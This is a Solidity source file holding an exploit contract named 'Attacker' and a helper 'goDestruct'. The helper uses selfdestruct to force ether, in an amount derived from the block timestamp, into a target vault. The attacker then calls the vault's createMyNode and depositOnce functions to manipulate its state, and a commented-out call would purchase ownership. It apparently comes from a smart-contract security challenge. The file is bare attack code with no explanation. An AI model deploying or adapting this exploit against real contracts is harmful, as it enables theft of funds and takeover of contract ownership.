pragma solidity ^0.8.0;

import "./IVault.sol";

contract goDestruct {

    function myDestruct(address to) external payable{
        selfdestruct(payable(to));
    }

}

contract Attacker {
    uint256 public OWNER_PURCHASE_COST = 10000000;
    IVault public vault;
    uint256 public BASE = 1999995;

    constructor(address _vault){
        vault = IVault(_vault);
    }

    function times() external view returns (uint256){
        return uint256(block.timestamp);
    }

    function attack() payable external{
        uint256 time = block.timestamp;
        goDestruct destruct = new goDestruct();
        destruct.myDestruct{value:time-1}(address(vault));
        vault.createMyNode(BASE,BASE,BASE);
        vault.depositOnce{value:1}(BASE);   
        // vault.purchaseForOwner();
    }
}